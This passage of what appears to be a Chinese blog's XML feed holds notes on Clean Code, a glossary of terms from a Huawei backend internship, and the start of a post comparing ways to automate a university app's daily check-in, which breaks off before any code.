class="number">1</span>);<span class="comment">//bb&gt;ba</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>警示：有时，用于警告其他程序员会出现某种后果的注释也是有用的。</p></li><li><p>TODO注释：有时用//TODO形式在源代码中放置要做的工作列表。如今，大多数好IDE都提供了特别的手段来定位所有TODO注释，所以TODO注释变得多余。</p></li><li><p>放大(Amplification)：注释可以用来放大某种看来不合理之物的重要性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String listItemContent=match.group(<span class="number">3</span>).trim();</span><br><span class="line"><span class="comment">//the trim is real important. It removes the starting//spaces that could cause the itam to be recognized</span></span><br><span class="line"><span class="comment">//as another list.</span></span><br><span class="line"><span class="keyword">new</span> ListItemwidget(<span class="keyword">this</span>, listItemContent, <span class="keyword">this</span>.level+<span class="number">1</span>); </span><br><span class="line"><span class="keyword">return</span> buildList(text.substring(match. end()));</span><br></pre></td></tr></table></figure></li><li><p>公共API中的Javadoc</p></li></ol><h2 id="44-bad-comments坏注释"><a class="markdownIt-Anchor" href="#44-bad-comments坏注释"></a> 4.4 Bad Comments(坏注释)</h2><ol><li><p>Mumbling：自言自语的注释，往往是作者边写代码边整理思路时留下的。</p></li><li><p>多余的注释(Redundant Comments)：对足够小的函数不需要再做注释，但是一些关键业务函数加上“他是用来做什么”之类的注释。</p></li><li><p>误导性注释(Misleading Comments)</p></li><li><p>循规式注释(Mandated Comments)：每个函数都要有Javadoc 或每个变量都要有注释的规矩是愚蠢可笑的。</p></li><li><p>日志式注释(Journal Comments)：很久以前，在模块开始处创建并维护这些记录还算有道理。那时，我们还没有源代码控制系统可用。如今，这种冗长的记录只会让模块变得凌乱不堪，应当全部删除。</p></li><li><p>废话注释(Noise Comments)</p></li><li><p>可怕的废话(Scary Noise)：Javadoc 也可能是废话。</p></li><li><p>Don’t Use a Comment When You can Use a Function or a Variable.</p></li><li><p>位置标记(Position Markers)</p></li><li><p>括号后面的注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (...) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="comment">//while</span></span><br></pre></td></tr></table></figure></li><li><p>归属与署名：源代码控制系统非常善于记住是谁在何时添加了什么，源代码控制系统是这类信息最好的归属地。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Added by Rick*/</span></span><br></pre></td></tr></table></figure></li><li><p>注释掉的代码：20世纪60年代，曾经有那么一段时间，注释掉的代码可能有用，但现在源代码控制系统记住不要的代码。</p></li><li><p>HTML注释</p></li><li><p>非本地信息：假如你一定要写注释，请确保它描述了离它最近的代码，别在本地注释的上下文环境中给出系统级的信息。</p></li><li><p>信息过多：别在注释中添加有趣的历史性话题或者无关的细节描述。</p></li><li><p>不明显的联系：注释及其描述的代码之间的联系应该显而易见。</p></li><li><p>函数头：短函数不需要太多描述。为只做一件事的短函数选个好名字，通常要比写函数头注释要好。</p></li><li><p>非公共代码中的Javadoc</p></li></ol><h1 id="ch5-formatting格式"><a class="markdownIt-Anchor" href="#ch5-formatting格式"></a> Ch5 Formatting(格式)</h1><h2 id="51-vertical-formatting垂直格式"><a class="markdownIt-Anchor" href="#51-vertical-formatting垂直格式"></a> 5.1 Vertical Formatting(垂直格式)</h2><p>有可能用大多数为200行、最长500行的单个文件构造出色的系统。尽管这并非不可违背的原则，也应该乐于接受。短文件通常比长文件易于理解。</p><ol><li><p>Vertical Openness Between Concepts(间隔)：在封包声明、导入声明和每个函数之间，都有空白行隔开。每个空白行都是一条线索，标识出新的独立概念。</p></li><li><p>Vertical Density(靠近)：紧密相关的代码应该互相靠近</p></li><li><p>Vertical Distance(垂直距离)：</p><ul><li><p>变量声明：变量声明应尽可能靠近其使用位置。因为函数很短，本地变量应该在函数的顶部出现。循环中的控制变量应该总是在循环语句中声明。</p></li><li><p>实体变量应该在类的顶部声明。关于实体变量应该放在哪里，争论不断。在C++中，通常会采用所谓“剪刀原则”（scissors rule），所有实体变量都放在底部。而在Java中，惯例是放在类的顶部。</p><blockquote><p>关于“剪刀原则”较为确切的解释：在类的头文件中，公共部分放在前面，私有部分放到后面，这样就可以用剪刀将文件一分为二，上半部分是该类的可用部分。</p></blockquote></li><li><p>相关函数：若某个函数调用了另外一个，就应该把它们放到一起，而且<strong>调用者应该尽可能放在被调用者上面</strong>。</p></li><li><p>概念相关：概念相关的代码应该放到一起。相关性越强，彼此之间的距离就该越短。这些函数有着极强的概念相关性，因为他们拥有共同的命名模式，执行同一基础任务的不同变种。互相调用是第二位的。即便没有互相调用，也应该放在一起。</p></li></ul></li></ol><h2 id="52-horizontal-formatting横向格式"><a class="markdownIt-Anchor" href="#52-horizontal-formatting横向格式"></a> 5.2 Horizontal Formatting(横向格式)</h2><ul><li><p>尽力保持代码行短小。死守80个字符的上限有点僵化，不反对代码行长度达到100个字符或120个字符。</p></li><li><p>无需拖动滚动条到右边的原则。但近年来显示器越来越宽，而年轻程序员又能将显示字符缩小到如此程度，屏幕上甚至能容纳200个字符的宽度。作者的上限是<strong>120</strong>个字符。</p></li></ul><ol><li><p>Horizontal Openness and Density(区隔与靠近)：使用空格字符将彼此紧密相关的事物连接到一起，也用空格字符把相关性较弱的事物分隔开。请看以下函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Func</span><span class="params">(String line)</span></span>&#123;<span class="comment">//不在函数名和左圆括号之间加空格,是函数与其参数密切相关；把参数隔开，是参数互相分离的</span></span><br><span class="line">lineCount++;</span><br><span class="line">    <span class="keyword">int</span> lineSize = line.length(); <span class="comment">//在赋值操作符周围加上空格字符，分隔表达式左边、右边</span></span><br><span class="line">    (-b + c) / (<span class="number">2</span>*a);<span class="comment">//空格表示运算顺序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>水平对齐：汇编语言程序使用水平对齐来强调某些程序结构，但是C、C++、Java不需要。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>    intNumber;</span><br><span class="line"><span class="keyword">float</span>  floatNumber;</span><br><span class="line"><span class="keyword">double</span> doubleNumber;</span><br></pre></td></tr></table></figure></li><li><p>缩进：在短小的if 语句、while循环或小函数中不要违反缩进规则。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &#123;<span class="keyword">return</span> ;&#125;</span><br></pre></td></tr></table></figure></li><li><p>空范围：while或for语句的语句体为空，尽量不使用。如果无法避免，就确保空范围体的缩进，用括号包围起来。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方式1</span></span><br><span class="line"><span class="keyword">while</span> (...)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//方式2</span></span><br><span class="line"><span class="keyword">while</span> (...)</span><br><span class="line">;</span><br></pre></td></tr></table></figure></li></ol><h2 id="53-team-rules团队规则"><a class="markdownIt-Anchor" href="#53-team-rules团队规则"></a> 5.3 Team Rules(团队规则)</h2><h1 id="ch6-objects-and-data-structures对象和数据结构"><a class="markdownIt-Anchor" href="#ch6-objects-and-data-structures对象和数据结构"></a> Ch6 Objects and Data Structures(对象和数据结构)</h1><h2 id="61-data-abstraction数据抽象"><a class="markdownIt-Anchor" href="#61-data-abstraction数据抽象"></a> 6.1 Data Abstraction(数据抽象)</h2><p>数据本体是否一定要隐藏起来，也要视使用场合而定；公共变量存在的原因就是其他类总会有存取他的需要。</p><p>不要乱加取值器和赋值器而曝露其内部结构。</p><h2 id="62-dataobjects-anti-symmetrey数据-对象的反对称性"><a class="markdownIt-Anchor" href="#62-dataobjects-anti-symmetrey数据-对象的反对称性"></a> 6.2 Data/Objects Anti-Symmetrey(数据、对象的反对称性)</h2><p>对象把数据隐藏于抽象之后，曝露操作数据的函数。数据结构曝露其数据，没有提供有意义的函数。</p><h2 id="63-the-law-of-demeter得墨忒耳律"><a class="markdownIt-Anchor" href="#63-the-law-of-demeter得墨忒耳律"></a> * 6.3 The Law of Demeter(得墨忒耳律)</h2><p>著名的得墨忒耳律（The Law of Demeter）认为，模块不应了解它所操作对象的内部情形。<br>更准确地说，得墨忒耳律认为，类C的方法f只应该调用以下对象的方法：</p><ul><li>C</li><li>由f创建的对象；</li><li>作为参数传递给f的对象；</li><li>由C的实体变量持有的对象。</li></ul><p>方法不应调用由任何函数返回的对象的方法。</p><h2 id="64-data-transfer-objects数据传送对象"><a class="markdownIt-Anchor" href="#64-data-transfer-objects数据传送对象"></a> 6.4 Data Transfer Objects(数据传送对象)</h2><p>最为精练的数据结构，是一个只有公共变量、没有函数的类。这种数据结构有时被称为数据传送对象，或DTO（Data Transfer Objects）。DTO是非常有用的结构，尤其是在与数据库通信、或解析套接字传递的消息之类场景中。在应用程序代码里一系列将原始数据转换为数据库的翻译过程中，它们往往是排头兵。</p><h1 id="ch7-error-handling错误处理"><a class="markdownIt-Anchor" href="#ch7-error-handling错误处理"></a> * Ch7 Error Handling(错误处理)</h1><p>错误处理很重要，但如果它搞乱了代码逻辑，就是错误的做法。</p><h2 id="71-使用异常而非返回码"><a class="markdownIt-Anchor" href="#71-使用异常而非返回码"></a> 7.1 使用异常而非返回码</h2><h2 id="72-write-your-try-catch-finally-statement-first"><a class="markdownIt-Anchor" href="#72-write-your-try-catch-finally-statement-first"></a> 7.2 Write Your Try-Catch-Finally Statement First</h2><h2 id="73-use-unchecked-exceptions使用不可控异常"><a class="markdownIt-Anchor" href="#73-use-unchecked-exceptions使用不可控异常"></a> 7.3 Use Unchecked Exceptions(使用不可控异常)</h2><p>可控异常的代价就是违反开放/闭合原则。如果你在方法中抛出可控异常，而catch 语句在三个层级之上，你就得在catch 语句和抛出异常处之间的每个方法签名中声明该异常。这意味着对软件中较低层级的修改，都将波及较高层级的签名。修改好的模块必须重新构建、发布，即便它们自身所关注的任何东西都没改动过。</p><h2 id="74-provide-context-with-exceptions给出异常发生的环境说明"><a class="markdownIt-Anchor" href="#74-provide-context-with-exceptions给出异常发生的环境说明"></a> 7.4 Provide Context with Exceptions(给出异常发生的环境说明)</h2><ul><li>抛出的每个异常，都应当提供足够的环境说明，以便判断错误的来源和处所。在Java中，你可以从任何异常里得到堆栈踪迹（stack trace）；然而，堆栈踪迹却无法告诉你该失败操作的初衷。</li><li>应创建信息充分的错误消息，并和异常一起传递出去。在消息中，包括失败的操作和失败类型。如果你的应用程序有日志系统，传递足够的信息给catch块，并记录下来。</li></ul><h2 id="75-define-exception-classes-in-terms-of-a-callers-needs依照调用者需要定义异常类"><a class="markdownIt-Anchor" href="#75-define-exception-classes-in-terms-of-a-callers-needs依照调用者需要定义异常类"></a> 7.5 Define Exception Classes in Terms of a Caller’s Needs(依照调用者需要定义异常类)</h2><p>对错误分类有很多方式。可以依其来源分类：是来目组件还是其他地方？或依其类型分类：是设备错误、网络错误还是编程错误？不过，当我们在应用程序中定义异常类时，最重要的考虑应该是他们如何被捕获。</p><h2 id="76-define-the-normal-flow定义常规流程"><a class="markdownIt-Anchor" href="#76-define-the-normal-flow定义常规流程"></a> 7.6 Define the Normal Flow(定义常规流程)</h2><h2 id="77-dont-return-null"><a class="markdownIt-Anchor" href="#77-dont-return-null"></a> 7.7 Don’t Return Null</h2><h2 id="78-dont-pass-null不传递null值"><a class="markdownIt-Anchor" href="#78-dont-pass-null不传递null值"></a> 7.8 Don’t Pass Null(不传递null值)</h2><h1 id="ch8-boundaries边界"><a class="markdownIt-Anchor" href="#ch8-boundaries边界"></a> * Ch8 Boundaries(边界)</h1><h2 id="81-using-third-party-code使用第三方代码"><a class="markdownIt-Anchor" href="#81-using-third-party-code使用第三方代码"></a> 8.1 Using Third-Party Code(使用第三方代码)</h2><p>第三方程序包和框架提供者追求普适性，这样就能在多个环境中工作，吸引广泛的用户。而使用者则想要集中满足特定需求的接口，这样会导致系统边界上出现问题。</p><h2 id="82-浏览和学习边界"><a class="markdownIt-Anchor" href="#82-浏览和学习边界"></a> 8.2 浏览和学习边界</h2><p>编写测试来浏览和理解第三方代码。</p><h1 id="ch9-unit-tests单元测试"><a class="markdownIt-Anchor" href="#ch9-unit-tests单元测试"></a> Ch9 Unit Tests(单元测试)</h1><h2 id="91-tdd三定律"><a class="markdownIt-Anchor" href="#91-tdd三定律"></a> 9.1 TDD三定律</h2><blockquote><p>TDD是<strong>测试驱动开发</strong>（Test-Driven Development）的英文简称，是敏捷开发中的一项核心实践和技术，也是一种设计方法论。TDD的原理是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。TDD虽是敏捷方法的核心实践，但不只适用于<a href="https://baike.baidu.com/item/XP/776028" target="_blank" rel="noopener">XP</a>（Extreme Programming），同样可以适用于其他开发方法和过程。</p></blockquote><p>三定律：</p><ol><li>在编写不能通过的单元测试前，不能编写生成代码；</li><li>只可编写刚好无法通过的单元测试，不能编译也算不通过；</li><li>只可编写刚好足以通过当前失败测试的生产代码。</li></ol><h2 id="92-keeping-tests-clean保持测试整洁"><a class="markdownIt-Anchor" href="#92-keeping-tests-clean保持测试整洁"></a> 9.2 Keeping Tests Clean(保持测试整洁)</h2><p>测试代码与生产代码一样重要。</p><p>测试能给软件带来各种好处，flexibilities(可扩展性)、relabilities(可靠性)等。</p><h2 id="93-clean-tests整洁的测试"><a class="markdownIt-Anchor" href="#93-clean-tests整洁的测试"></a> 9.3 Clean Tests(整洁的测试)</h2><h2 id="94-one-assert-per-test每个测试一个断言"><a class="markdownIt-Anchor" href="#94-one-assert-per-test每个测试一个断言"></a> 9.4 One Assert per Test(每个测试一个断言)</h2><ul><li>有流派认为，JUnit中每个测试函数都应该有且只有一个断言语句。</li><li>单个测试中的断言数量应该最小化。</li></ul><h2 id="95-first"><a class="markdownIt-Anchor" href="#95-first"></a> 9.5 F.I.R.S.T.</h2><ul><li>**快速（Fast）**测试应该够快。测试应该能快速运行。测试运行缓慢，你就不会想要频繁地运行它。如果你不频繁运行测试，就不能尽早发现问题，也无法轻易修正，从而也不能轻而易举地清理代码。最终，代码就会腐坏。</li><li>**独立（Independent）**测试应该相互独立。某个测试不应为下一个测试设定条件。你应该可以单独运行每个测试，及以任何顺序运行测试。当测试互相依赖时，头一个没通过就会导致一连串的测试失败，使问题诊断变得困难，隐藏了下级错误。</li><li>**可重复（Repeatable）**测试应当可在任何环境中重复通过。你应该能够在生产环境、质检环境中运行测试，也能够在无网络的列车上用笔记本电脑运行测试。如果测试不能在任意环境中重复，你就总会有个解释其失败的接口。当环境条件不具备时，你也会无法运行测试。</li><li>**自足验证（Self-Validating）**测试应该有布尔值输出。无论是通过或失败，你不应该查看日志文件来确认测试是否通过。你不应该手工对比两个不同文本文件来确认测试是否通过。如果测试不能自足验证，对失败的判断就会变得依赖主观，而运行测试也需要更长的手工操作时间。</li><li>**及时（Timely）**测试应及时编写。单元测试应该恰好在使其通过的生产代码之前编写。如果在编写生产代码之后编写测试，你会发现生产代码难以测试。你可能会认为某些生产代码本身难以测试。你可能不会去设计可测试的代码。</li></ul><h1 id="ch10-classes类"><a class="markdownIt-Anchor" href="#ch10-classes类"></a> Ch10 Classes(类)</h1><h2 id="101-class-organization类的组织"><a class="markdownIt-Anchor" href="#101-class-organization类的组织"></a> 10.1 Class Organization(类的组织)</h2><p>遵循标准的Java约定，类应该从一组变量列表开始。如果有公共静态常量，应该先出现。然后是私有静态变量，以及私有实体变量。很少会有公共变量。公共函数应跟在变量列表之后。我们喜欢把由某个公共函数调用的私有工具函数紧随在该公共函数后面。这符合了自顶向下原则，让程序读起来就像一篇报纸文章。</p><h2 id="102-class-should-be-small类应该短小"><a class="markdownIt-Anchor" href="#102-class-should-be-small类应该短小"></a> 10.2 Class Should Be Small!(类应该短小)</h2><p>对于函数，我们通过计算代码行数衡量大小。对于类，我们采用不同的衡量方法，计算权责（responsibility）。</p><ol><li><p>单一权责原则：一个类应该只有一个发生变化的原因。</p></li><li><p>内聚：</p><ul><li>类应该只有少量实体变量。类中的每个方法都应该操作一个或多个这种变量。通常而言，方法操作的变量越多，就越黏聚到类上。如果一个类中的每个变量都被每个方法所使用，则该类具有最大的内聚性。</li><li>一般来说，创建这种极大化内聚类是既不可取也不可能的；另一方面，我们希望内聚性保持在较高位置。内聚性高，意味着类中的方法和变量互相依赖、互相结合成一个逻辑整体。</li></ul></li><li><p>保持内聚性就会得到许多短小的类</p></li></ol><h2 id="103-organizing-for-change为了修改而组织"><a class="markdownIt-Anchor" href="#103-organizing-for-change为了修改而组织"></a> 10.3 Organizing for Change(为了修改而组织)</h2><blockquote><p>依赖倒置原则(DIP)：高层模块不应该依赖低层模块，二者都应该依赖其抽象；抽象不应该依赖细节；细节应该依赖抽象。</p></blockquote><p>DIP认为类应当依赖于抽象而不是依赖于具体细节。</p><h1 id="ch11-systems系统"><a class="markdownIt-Anchor" href="#ch11-systems系统"></a> * Ch11 Systems(系统)</h1><h2 id="111-separate-constructing-a-system-from-using-it将系统的构造与使用分开"><a class="markdownIt-Anchor" href="#111-separate-constructing-a-system-from-using-it将系统的构造与使用分开"></a> 11.1 Separate Constructing a System from Using It(将系统的构造与使用分开)</h2><ol><li>分解main</li><li>工厂</li><li>依赖注入</li></ol><h2 id="112-scaling-up扩容"><a class="markdownIt-Anchor" href="#112-scaling-up扩容"></a> 11.2 Scaling Up(扩容)</h2><h2 id="113-java-proxiesjava代理"><a class="markdownIt-Anchor" href="#113-java-proxiesjava代理"></a> 11.3 Java Proxies(Java代理)</h2><h2 id="114-pure-java-aop-frameworks纯java-aop框架"><a class="markdownIt-Anchor" href="#114-pure-java-aop-frameworks纯java-aop框架"></a> 11.4 Pure Java AOP Frameworks(纯Java AOP框架)</h2><h2 id="115-aspectj-aspectsaspectj的方面"><a class="markdownIt-Anchor" href="#115-aspectj-aspectsaspectj的方面"></a> 11.5 AspectJ Aspects(AspectJ的方面)</h2><h2 id="116-test-drive-the-system-architecture测试驱动系统框架"><a class="markdownIt-Anchor" href="#116-test-drive-the-system-architecture测试驱动系统框架"></a> 11.6 Test Drive the System Architecture(测试驱动系统框架)</h2><h2 id="117-optimize-decision-making优化决策"><a class="markdownIt-Anchor" href="#117-optimize-decision-making优化决策"></a> 11.7 Optimize Decision Making(优化决策)</h2><h1 id="ch12-emergence迭进"><a class="markdownIt-Anchor" href="#ch12-emergence迭进"></a> Ch12 Emergence(迭进)</h1><p>Kent Beck关于简单设计的四条规则：</p><ol><li>运行所有测试；</li><li>不可重复；</li><li>表达了程序员的意图；</li><li>尽可能减少类和方法的数量；</li></ol><p>以上规则按其重要程度排列。</p><h1 id="ch13-concurrency并发编程"><a class="markdownIt-Anchor" href="#ch13-concurrency并发编程"></a> * Ch13 Concurrency(并发编程)</h1><blockquote><p>“对象是过程的抽象。线程是调度的抽象。”   一James O Coplien</p></blockquote><h2 id="131-并发防御原则"><a class="markdownIt-Anchor" href="#131-并发防御原则"></a> 13.1 并发防御原则</h2><ol><li>单一权责原则：分离并发相关代码与其他代码</li><li>限制数据作用域：谨记数据封装；严格限制对可能被共享的数据的访问。</li><li>使用数据副本</li><li>线程尽可能独立：尝试将数据分解到可被独立线程（可能在不同处理器上）操作的独立子集。</li></ol><h1 id="ch14-successive-refinement逐步改进"><a class="markdownIt-Anchor" href="#ch14-successive-refinement逐步改进"></a> Ch14 Successive Refinement(逐步改进)</h1><h1 id="ch15-junit-internalsjunit内幕"><a class="markdownIt-Anchor" href="#ch15-junit-internalsjunit内幕"></a> * Ch15 JUnit Internals(JUnit内幕)</h1><h1 id="ch16-refactoring-serialdate重构-serialdate"><a class="markdownIt-Anchor" href="#ch16-refactoring-serialdate重构-serialdate"></a> * Ch16 Refactoring SerialDate(重构 SerialDate)</h1><h1 id="ch17-smells-and-heuristics味道与启发"><a class="markdownIt-Anchor" href="#ch17-smells-and-heuristics味道与启发"></a> * Ch17 Smells and Heuristics(味道与启发)</h1>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IT书籍 </tag>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021年华为C++后端实习名词积累</title>
      <link href="/2022/04/15/2021%E5%B9%B4%E5%8D%8E%E4%B8%BAC++%E5%90%8E%E7%AB%AF%E5%AE%9E%E4%B9%A0%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/"/>
      <url>/2022/04/15/2021%E5%B9%B4%E5%8D%8E%E4%B8%BAC++%E5%90%8E%E7%AB%AF%E5%AE%9E%E4%B9%A0%E5%90%8D%E8%AF%8D%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-perl语言"><a class="markdownIt-Anchor" href="#1-perl语言"></a> 1 Perl语言</h1><p>本次实习主要成果：基于SR的全量/增量覆盖率统计。</p><p>部门之前的该部分脚本是使用Perl语言编写的，晦涩难懂，没有维护人员。</p><p><a href="https://www.runoob.com/perl/perl-intro.html" target="_blank" rel="noopener">菜鸟教程——Perl语言教程</a></p><h1 id="2-ut-it-st"><a class="markdownIt-Anchor" href="#2-ut-it-st"></a> 2 UT &amp; IT &amp; ST</h1><h2 id="21-utunit-test单元测试"><a class="markdownIt-Anchor" href="#21-utunit-test单元测试"></a> 2.1 UT（Unit Test）：单元测试</h2><img src="https://s2.loli.net/2022/04/15/zqP8duipHcGLo9A.png" width="800" height="450" alt="图片名称" align="center" id="142"><img src="https://s2.loli.net/2022/04/15/1rNEqOydYzTGlM8.png" width="800" height="450" alt="图片名称" align="center" id="143"><h2 id="22-itintegration-test集成测试"><a class="markdownIt-Anchor" href="#22-itintegration-test集成测试"></a> 2.2 IT（Integration Test）：集成测试</h2><h2 id="23-stsystem-test系统测试"><a class="markdownIt-Anchor" href="#23-stsystem-test系统测试"></a> 2.3 ST（System Test）：系统测试</h2><img src="https://s2.loli.net/2022/04/15/Pqu6ZcTo3V12Aki.png" width="800" height="450" alt="图片名称" align="center" id="144"><h1 id="3-dtdevelpor-test开发者测试"><a class="markdownIt-Anchor" href="#3-dtdevelpor-test开发者测试"></a> 3 DT（Develpor Test）：开发者测试</h1><img src="https://s2.loli.net/2022/04/15/LiBpyJIXtcT7Ehx.png" width="800" height="450" alt="图片名称" align="center" id="145"><img src="https://s2.loli.net/2022/04/15/iYqjF5adrbM64yP.png" width="800" height="450" alt="图片名称" align="center" id="146"><img src="https://s2.loli.net/2022/04/15/oOHX4u95I8UabyE.png" width="800" height="450" alt="图片名称" align="center" id="147"><p><strong>参考</strong>：</p><ul><li><a href="https://developer.huaweiuniversity.com/courses/course-v1:HuaweiX+20210203+Self-paced/courseware/25e635447c474515909fd984d075dee7/5bfcf9c7a1dc4f3b8c0d78038bd21e36/" target="_blank" rel="noopener">华为课程学习</a></li><li><a href="https://xie.infoq.cn/article/126ff8488cd203a65a60d9643" target="_blank" rel="noopener">开发者测试：你必须知道 7 件事</a></li></ul><h1 id="4-tddtest-driven-development测试驱动开发"><a class="markdownIt-Anchor" href="#4-tddtest-driven-development测试驱动开发"></a> 4 TDD（Test-Driven Development）：测试驱动开发</h1><p>测试驱动开发，在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。</p><h1 id="5-cleancode"><a class="markdownIt-Anchor" href="#5-cleancode"></a> 5 cleancode</h1><blockquote><p>详见博客<code>《代码整洁之道 clean code》笔记</code></p></blockquote><p>软件工程领域的大师级人物罗伯特·马丁(Robert C. Martin)所著的一本重量级经典图书《Clean Code》，中文译为代码整洁之道，书中提出代码质量与其整洁度成正比。 比如编程要遵守一些原则；命名、注释、函数。</p><p><strong>参考</strong>：<a href="https://blog.csdn.net/nkGavinGuo/article/details/103752914" target="_blank" rel="noopener">浅谈Clean Code</a></p><h1 id="6-sr-ar"><a class="markdownIt-Anchor" href="#6-sr-ar"></a> 6 SR &amp; AR</h1><ul><li><strong>IR（Initial Requirement）</strong>：初始需求</li><li><strong>SR（System Requirement）</strong>：系统需要</li><li><strong>AR（Allocation Requirement）</strong>：配置需求</li><li><strong>SA（System Analyst）</strong>：系统分析师，</li><li><strong>SE（System Engineer）</strong>：系统工程师</li><li><strong>MDE（Module Design Engineer）</strong>：模块设计师，当SE把不同模块之间的接口大致画清晰后，模块内部的设计交给MDE来进行；<a href="https://blog.csdn.net/isscollege/article/details/75022142" target="_blank" rel="noopener">敏捷之MDE认知</a></li><li><strong>User Story</strong>：用户故事； <a href="http://www.woshipm.com/user-research/1725827.html" target="_blank" rel="noopener">用户故事（一）：什么是用户故事？</a></li></ul><img src="https://s2.loli.net/2022/04/15/fJ74SagOE6NRM8e.png" width="800" height="450" alt="图片名称" align="center" id="148"><p><strong>步骤</strong>：</p><ol><li><p><strong>需求经理</strong>：将用户需求（user story）转换成 客户能够接受的 初始需求 IR（Initial Requirement）</p></li><li><p><strong>SA</strong>：IR 拆分为 SR</p></li><li><p><strong>SE</strong>：SR 继续拆分 AR</p></li><li><p><strong>MDE</strong>：当SE把不同模块之间的接口大致画清晰后，模块内部的设计交给MDE来进行；</p></li></ol><p><strong>参考</strong>：<a href="https://blog.csdn.net/minminzhe520/article/details/52164752" target="_blank" rel="noopener">我从华为身上学到的项目管理经验 – 需求篇</a></p><h1 id="7-敏捷开发"><a class="markdownIt-Anchor" href="#7-敏捷开发"></a> 7 敏捷开发</h1><p>敏捷开发是一种项目管理和软件开发的迭代方法，侧重于协作、客户反馈和快速发布。</p><p>敏捷开发以用户的需求进化为核心，采用迭代、循序渐进的方法进行软件开发，适用于竞争激烈，快速变化的市场。敏捷的客户协作观念，快速迭代能帮助团队以最小成本，最快速度满足客户真正的需求。</p><p>其特点：“个体与交互”胜过“过程与工具”、“可以工作的软件”胜过“面面俱到的文挡”、“客户协作”胜过“合同谈判”、“响应变化”胜过“遵循计划”。</p><p>敏捷开发迭代流程一般遵循以下五个步骤：需求分析（requirements analysis）、产品设计（design）、功能编码（coding）、功能测试（testing）、部署评估（deployment / evaluation）。流程图如下：</p><img src="https://s2.loli.net/2022/04/15/qWpRhD3SQ7NltMX.png" width="800" height="450" alt="图片名称" align="center" id="149"><p><strong>参考</strong>：<a href="https://kknews.cc/news/5r38jvl.html" target="_blank" rel="noopener">四種軟體開發模式（瀑布、疊代、螺旋、敏捷），對比分析</a></p><h1 id="8-持续集成"><a class="markdownIt-Anchor" href="#8-持续集成"></a> 8 持续集成</h1><p>持续集成是一种软件开发实践，即团队开发成员经常集成他们的工作，通常每个成员每天至少集成一次，也就意味着每天可能会发生多次集成。每次集成都通过自动化的构建（包括编译，发布，自动化测试）来验证，从而尽早地发现集成错误。</p><p>实习部门使用Jenkins自动化部署， Jenkins是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件的持续集成变成可能。</p><h1 id="9-devops"><a class="markdownIt-Anchor" href="#9-devops"></a> 9 DevOps</h1><p>DevOps（Development和Operations的组合词）是一种重视“软件开发人员（Dev）”和“IT运维技术人员（Ops）”之间沟通合作的文化、运动或惯例。通过自动化“软件交付”和“架构变更”的流程，来使得构建、测试、发布软件能够更加地快捷、频繁和可靠。</p>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>i南航自动打卡</title>
      <link href="/2022/04/13/i%E5%8D%97%E8%88%AA%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/"/>
      <url>/2022/04/13/i%E5%8D%97%E8%88%AA%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-引言"><a class="markdownIt-Anchor" href="#1-引言"></a> 1 引言</h1><p><strong>需求</strong>：每天的i南航打卡比较难受，想自动化处理此事。</p><p><strong>声明</strong>：学习与技术讨论，勿实操！！！</p><h1 id="2-解决"><a class="markdownIt-Anchor" href="#2-解决"></a> 2 解决</h1><p>解决思路主要用四种：</p><table><thead><tr><th style="text-align:center">方法</th><th style="text-align:left">优点</th><th style="text-align:left">缺点</th></tr></thead><tbody><tr><td style="text-align:center">快捷指令</td><td style="text-align:left">1. 方便；<br>2. 打卡失败与否，提醒明显</td><td style="text-align:left">1. 只适用于iPhone和iPad；<br>2. 会上传cookie，安全性无法保障；<br>3. 由于是别人编写的快捷指令，更新受制于人。</td></tr><tr><td style="text-align:center">Curl指令</td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">Post请求</td><td 